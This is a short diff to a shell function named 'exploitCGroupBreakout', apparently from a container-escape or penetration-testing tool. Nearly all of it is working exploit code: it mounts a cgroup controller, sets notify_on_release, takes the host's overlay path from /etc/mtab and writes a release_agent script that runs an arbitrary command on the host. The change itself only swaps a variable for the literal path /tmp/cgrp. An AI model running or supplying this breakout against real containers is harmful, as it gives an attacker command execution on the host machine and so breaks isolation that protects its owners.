@@ -13,13 +13,13 @@ exploitCGroupBreakout() {
   else
     # else, cgroup is not mounted as read-write, try to mount rdma controller and gain access to write to the cgroup
     d=/tmp/cgrp
-    mkdir -p $d && mount -t cgroup -o rdma cgroup $d && mkdir $d/x
+    mkdir -p $d && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir $d/x
   fi
 
   echo 1 > $d/x/notify_on_release
   host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
   touch /output
-  echo "$host_path/cmd_to_execute" > $d/release_agent
+  echo "$host_path/cmd_to_execute" > /tmp/cgrp/release_agent
   echo '#!/bin/sh' > /cmd_to_execute
   echo "$cmd > $host_path/output" >> /cmd_to_execute
   chmod +x /cmd_to_execute
